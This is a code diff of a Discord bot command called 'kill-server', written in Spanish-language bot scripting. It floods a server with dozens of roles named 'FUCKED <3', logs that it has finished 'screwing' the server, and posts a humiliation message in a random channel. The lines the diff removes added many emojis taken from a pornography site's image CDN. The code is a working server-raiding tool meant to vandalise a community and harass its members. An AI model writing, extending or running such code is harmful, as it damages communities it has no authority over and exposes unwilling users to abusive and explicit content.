@@ -1,40 +1,10 @@
 module.exports = ({
 name: "kill-server",
 code: `
-module.exports = ({
-name: "kill-server",
-code: `
 $log[✅  He terminado de joder el servidor "$serverName"]
 $channelSendMessage[$randomChannelID;✅ He terminado de joder el servidor :)]
 $log[🕖  Mandando un mensaje de humillación en un canal aleatorio...]
 
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-$addEmoji[https://cdn77-pic.xnxx-cdn.com/videos/thumbs169xnxxll/d9/1e/6d/d91e6d7d504d0e1112d4fa967b759395/d91e6d7d504d0e1112d4fa967b759395.27.jpg;FUCKED;no]
-
-$log[🕖  Creando 50 emojis porno en el servidor "$serverName"...]
-
 $createRole[FUCKED <3;cb3234]
 $createRole[FUCKED <3;cb3234]
 $createRole[FUCKED <3;cb3234]
@@ -95,18 +65,6 @@ $createRole[FUCKED <3;cb3234]
 $createRole[FUCKED <3;cb3234]
 $createRole[FUCKED <3;cb3234]
 $createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-$createRole[FUCKED <3;cb3234]
-
 
 $log[🕖  Creando 100 roles en el servidor "$serverName"...]
 
